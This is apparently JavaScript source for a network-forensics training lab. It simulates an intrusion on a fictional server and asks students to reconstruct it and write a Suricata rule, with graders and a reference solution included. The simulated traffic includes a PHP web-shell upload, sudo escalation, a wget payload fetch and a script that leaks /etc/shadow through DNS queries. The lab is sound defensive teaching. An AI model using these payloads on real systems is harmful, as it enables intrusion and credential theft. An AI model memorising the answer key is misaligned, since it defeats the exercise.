    var t0 = at(30), L2 = [], UA = "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0";
    [21, 22, 23, 25, 80, 110, 139, 443, 445, 3306, 8080, 8081].forEach(function (p, i) { L2 = L2.concat(synProbe(t0 + i * 0.002, ATT, LEG, 61200, p, p === 22 || p === 80 || p === 8081 ? true : p === 3306 ? null : false, 31000)); });
    L2 = L2.concat(conv(t0 + 60, ATT, LEG, 52300, 80, [{ data: req("GET", "/upload.php", "intranet.kestrel.internal", UA) }, { b: true, data: resp(200, "OK", "Apache/2.4.29 (Ubuntu)", "Content-Type: text/html\r\n", "<form enctype=\"multipart/form-data\" method=\"post\"><input type=\"file\" name=\"avatar\"></form>"), gap: 0.01 }]));
    var mp = "------x\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"avatar.php\"\r\nContent-Type: image/png\r\n\r\n<?php system($_GET['c']); ?>\r\n------x--\r\n";
    L2 = L2.concat(conv(t0 + 75, ATT, LEG, 52301, 80, [{ data: req("POST", "/upload.php", "intranet.kestrel.internal", UA, "Content-Type: multipart/form-data; boundary=----x\r\n", mp) }, { b: true, data: resp(200, "OK", "Apache/2.4.29 (Ubuntu)", "Content-Type: text/html\r\n", "Uploaded to /uploads/avatar.php"), gap: 0.02 }]));
    [["id", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"], ["sudo%20-n%20-l", "User www-data may run the following commands on kc-legacy-01:\n    (ALL) NOPASSWD: ALL\n"], ["sudo%20-n%20id", "uid=0(root) gid=0(root) groups=0(root)\n"], ["sudo%20-n%20wget%20-q%20-O%20/tmp/.x%20http://" + DROP + "/x.sh", ""]].forEach(function (c, i) {
      L2 = L2.concat(conv(t0 + 100 + i * 20, ATT, LEG, 52310 + i, 80, [{ data: req("GET", "/uploads/avatar.php?c=" + c[0], "intranet.kestrel.internal", UA) }, { b: true, data: resp(200, "OK", "Apache/2.4.29 (Ubuntu)", "Content-Type: text/html\r\n", c[1]), gap: 0.04 }]));
    });
    L2 = L2.concat(conv(t0 + 161, LEG, DROP, 40500, 80, [{ data: req("GET", "/x.sh", DROP, "Wget/1.19.4 (linux-gnu)") }, { b: true, data: resp(200, "OK", "nginx/1.18.0", "Content-Type: application/x-sh\r\n", "#!/bin/sh\nfor f in /etc/shadow /var/www/html/config.php; do base32 -w0 $f | fold -w 50 | while read c; do dig +short TXT $c.d." + EXFIL + "; done; done\n"), gap: 0.06 }]));
    for (var q = 0; q < 20; q++) L2 = L2.concat(P.dns(t0 + 170 + q * 0.6, LEG, "10.20.0.2", 47000 + q, 0x3100 + q, b32(q + 300, 50) + ".d." + EXFIL, "TXT", [{ type: "TXT", data: "\"1\"", ttl: 0 }]));
    for (var s = 0; s < 6; s++) L2 = L2.concat(conv(t0 + 200 + s * 3, LEG, "10.20.0.21", 41000 + s, 22, [{ data: "SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7\r\n" }, { b: true, data: "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\r\n", gap: 0.003 }, { enc: { len: 1080, seed: 500 + s }, gap: 0.01 }, { b: true, enc: { len: 1080, seed: 600 + s }, gap: 0.01 }]));
    L2 = L2.concat(conv(t0 + 240, "10.20.5.22", ME, 50122, 22, [{ enc: { len: 36, seed: 9 }, app: "SSH (encrypted)" }, { b: true, enc: { len: 52, seed: 11 }, app: "SSH (encrypted)" }], { open: true }));
    L2 = L2.concat(P.dns(t0 + 250, ME, "10.20.0.2", 40900, 0x0f01, "kc-db-01.kestrel.internal", "A", [{ type: "A", data: "10.20.0.21", ttl: 3600 }]));
    return sortT(L2);
  }
  function accessLog() {
    var base = NOW - 30 * HOUR, L2 = [], UA = "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0";
    function ts(ms) { var d = new Date(ms), M = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]; return ("0" + d.getUTCDate()).slice(-2) + "/" + M[d.getUTCMonth()] + "/" + d.getUTCFullYear() + ":" + M2.tod(ms) + " +0000"; }
    function a(ms, ip, m, path, st, size, ua) { L2.push(ip + " - - [" + ts(ms) + "] \"" + m + " " + path + " HTTP/1.1\" " + st + " " + size + " \"-\" \"" + ua + "\""); }
    a(base - 3600000, "10.20.5.31", "GET", "/dashboard", 200, 4120, FIREFOX); a(base - 3500000, "10.20.5.31", "POST", "/login", 302, 0, FIREFOX);
    a(base + 60000, ATT, "GET", "/upload.php", 200, 98, UA); a(base + 75000, ATT, "POST", "/upload.php", 200, 31, UA);
    a(base + 100000, ATT, "GET", "/uploads/avatar.php?c=id", 200, 54, UA); a(base + 120000, ATT, "GET", "/uploads/avatar.php?c=sudo%20-n%20-l", 200, 88, UA);
    a(base + 140000, ATT, "GET", "/uploads/avatar.php?c=sudo%20-n%20id", 200, 39, UA); a(base + 160000, ATT, "GET", "/uploads/avatar.php?c=sudo%20-n%20wget%20-q%20-O%20/tmp/.x%20http://" + DROP + "/x.sh", 200, 0, UA);
    a(base + 7200000, "10.20.5.31", "GET", "/dashboard", 200, 4120, FIREFOX);
    return L2.join("\n") + "\n";
  }
  var INC_FILES = function () { return { "captures/incident.pcap": N.pcapFile(incident()), "evidence/legacy-access.log": accessLog(), "evidence/README.txt": "Copied from kc-legacy-01 by Dev at 09:10:\n  legacy-access.log   Apache access log for intranet.kestrel.internal\nThe capture is from the server LAN tap, 30 hours ago.\n" }; };
  LABS.push({
    id: "net-308", n: 29, module: 3, ticket: "NET-308", xp: 260, layer: "L2–7", capstone: true,
    title: "Reconstruct an intrusion",
    topic: "Capstone: from a capture and a log, work out what an attacker did",
    from: DEV,
    story: "<p>kc-legacy-01 was compromised the night before last. We have the server LAN tap's capture from the time (<code>~/captures/incident.pcap</code>) and the intranet's Apache log (<code>~/evidence/legacy-access.log</code>). Management wants the full story by this afternoon: <b>who</b> got in, <b>how</b>, what they ran, what they took and where they went next.</p><p>Use everything from this module. And write me a Suricata rule so we catch this next time.</p>",
    learn:
      "<h3>Your brief</h3><p>No hints in a capstone. Produce these files in <code>~/report/</code>:</p>" +
      '<table class="t"><tr><th>File</th><th>Contents</th></tr>' +
      "<tr><td><code>attacker.txt</code></td><td>the attacker's address</td></tr>" +
      "<tr><td><code>entry.txt</code></td><td>the path of the file they uploaded and then used to run commands (the web shell)</td></tr>" +
      "<tr><td><code>root.txt</code></td><td>the command they used to become root</td></tr>" +
      "<tr><td><code>tool.txt</code></td><td>the URL of the tool they downloaded</td></tr>" +
      "<tr><td><code>exfil.txt</code></td><td>the domain they leaked data through</td></tr>" +
      "<tr><td><code>lateral.txt</code></td><td>the internal server they tried to reach next, and the service</td></tr></table>" +
      "<p>Also add a rule to <code>/etc/suricata/rules/local.rules</code> that alerts on <b>every request to the web shell</b> and nothing else, and show it firing on the capture.</p>" +
      '<div class="callout">Tools you have: tcpdump, tshark (conversations, fields, follow), Suricata (the community rules already know some of this), Zeek and zeek-cut, grep/awk/sort on the log.</div>' +
      "<p>The reference solution is hidden behind a button on the Tasks tab; revealing it halves this capstone's XP.</p>",
    files: INC_FILES(),
    system: pre(["tshark", "suricata", "zeek"]),
    diagram: ["legacy", "db"],
    starter: "",
    objectives: [
      { id: "attacker", hints: [], text: "<code>~/report/attacker.txt</code>: the attacker's address.", check: function (r) { return word(r, "report/attacker.txt") === ATT ? true : "Who scanned kc-legacy-01 and then used the intranet?"; } },
      { id: "entry", hints: [], text: "<code>~/report/entry.txt</code>: the web shell's path on the server.", check: function (r) { return /^\/uploads\/avatar\.php$/.test(word(r, "report/entry.txt")) ? true : "The path the uploaded file was requested at (no query string)."; } },
      { id: "root", hints: [], text: "<code>~/report/root.txt</code>: the command that gave them root.", check: function (r) { var t = word(r, "report/root.txt"); return /^sudo\b/.test(t) && !/wget/.test(t) ? true : "Decode the web shell's commands (%20 is a space): which one ran as uid=0?"; } },
      { id: "tool", hints: [], text: "<code>~/report/tool.txt</code>: the downloaded tool's URL.", check: function (r) { return word(r, "report/tool.txt") === "http://" + DROP + "/x.sh" ? true : "What did kc-legacy-01 itself fetch over HTTP?"; } },
      { id: "exfil", hints: [], text: "<code>~/report/exfil.txt</code>: the domain the data left through.", check: function (r) { var t = word(r, "report/exfil.txt"); return t === EXFIL || t === "d." + EXFIL ? true : "Read the tool, then look at kc-legacy-01's DNS queries."; } },
      { id: "lateral", hints: [], text: "<code>~/report/lateral.txt</code>: the internal server and service they tried next.", check: function (r) { var t = word(r, "report/lateral.txt"); return t.indexOf("10.20.0.21") >= 0 && /\b(ssh|22)\b/.test(t) ? true : "After the exfiltration, kc-legacy-01 connects to another server: which, on what?"; } },
      {
        id: "rule", hints: [], text: "A rule in <code>local.rules</code> that alerts on every request to the web shell and nothing else, shown firing on the capture.",
        check: function (r) {
          var lr = localRules(r).filter(Boolean), pk = incident();
          var hits = alertsOf(lr, pk), shell = pk.filter(function (p) { return p.data != null && /^GET \/uploads\/avatar\.php/.test(p.data); });
          if (!hits.length) return "No rule in local.rules alerts on the capture.";
          if (hits.some(function (a) { return !(a.p.data != null && /^GET \/uploads\/avatar\.php/.test(a.p.data)); })) return "Your rule alerts on other traffic too: only the web shell's requests.";
          if (hits.length < shell.length) return "Your rule misses some of the web shell's requests.";
          return ran(r, /\bsuricata\b.*-r\b.*incident\.pcap/) && ran(r, /\b(cat|grep|jq|less|tail|head)\b.*(fast\.log|eve\.json)/, function (e) { return outHas(e, new RegExp("\\[1:" + hits[0].r.sid + ":")) || outHas(e, new RegExp("\"signature_id\":" + hits[0].r.sid)) || outHas(e, /avatar/); }) ? true : "Run Suricata on the capture and show your alerts in its log.";
        }
      }
    ],
    solution: lines("mkdir -p ~/report ~/ids ~/zeek", "tshark -r ~/captures/incident.pcap -q -z conv,tcp", "tcpdump -r ~/captures/incident.pcap -n 'tcp[tcpflags] == tcp-syn' | head",
      "grep -v '^10\\.' ~/evidence/legacy-access.log", "tshark -r ~/captures/incident.pcap -Y http.request -T fields -e ip.src -e http.request.uri -e http.user_agent",
      "tcpdump -r ~/captures/incident.pcap -n -A 'tcp port 80 and host 10.20.0.40' | grep -E 'uid=|NOPASSWD|for f in'",
      "cd ~/zeek && zeek -r ~/captures/incident.pcap", "zeek-cut id.orig_h query < dns.log | sort | uniq -c | sort -rn | head", "zeek-cut id.orig_h id.resp_h id.resp_p service < conn.log | grep '^10.20.0.40'", "cd ~",
      "echo " + ATT + " > ~/report/attacker.txt", "echo /uploads/avatar.php > ~/report/entry.txt", "echo 'sudo -n id' > ~/report/root.txt", "echo http://" + DROP + "/x.sh > ~/report/tool.txt", "echo " + EXFIL + " > ~/report/exfil.txt", "echo '10.20.0.21 ssh' > ~/report/lateral.txt",
      "echo 'alert http any any -> $HOME_NET 80 (msg:\"KESTREL web shell avatar.php\"; flow:to_server,established; http.uri; content:\"/uploads/avatar.php\"; sid:1000020; rev:1;)' | sudo tee -a /etc/suricata/rules/local.rules",
      "suricata -r ~/captures/incident.pcap -l ~/ids", "cat ~/ids/fast.log"),
    debrief: "<p><b>Module 3 complete.</b> The story, start to finish: <b>198.51.100.23</b> scanned kc-legacy-01, found the intranet's unrestricted <code>/upload.php</code> and uploaded <code>avatar.php</code>, a one-line PHP web shell. Through it they ran <code>id</code> (www-data), <code>sudo -n -l</code> (www-data could run <b>anything</b> as root without a password) and <code>sudo -n id</code>: root. Then the server itself fetched <code>x.sh</code> over HTTP, which base32-encoded /etc/shadow and the app's config into DNS questions under <code>" + EXFIL + "</code>, and finally tried SSH to kc-db-01.</p>" +
      "<p>Every step was visible on the wire: the scan as SYNs and RSTs, the upload and commands in clear-text HTTP, the escalation in the responses, the tunnel in dns.log, the lateral movement in conn.log. Module 4 is the other side: closing every door this attacker used, then scanning again to prove it.</p>",
    realworld: "Practise on public incident captures (malware-traffic-analysis.net, the SANS and DFIR challenges): the same tools, the same questions.",
    quiz: []
  });

  LABS.forEach(function (l) { l.drills = l.drills || []; T.LABS.push(l); });
  T.UPCOMING = T.UPCOMING.filter(function (x) { return x.module !== 3; });
  T.M3 = { clearCapture: clearCapture, scanCapture: scanCapture, bruteSys: bruteSys, mitmSys: mitmSys, poisonSys: poisonSys, poisonCapture: poisonCapture, floodSys: floodSys, idsCapture: idsCapture, idsSys: idsSys, zeekCapture: zeekCapture, zeekSys: zeekSys, incident: incident, accessLog: accessLog, localRules: localRules, alertsOf: alertsOf, loadAll: loadAll, pre: pre, conv: conv, synProbe: synProbe, req: req, resp: resp, at: at, sortT: sortT, EVIL: EVIL, EVIL_MAC: EVIL_MAC, ROGUE: ROGUE, C2: C2 };
})();
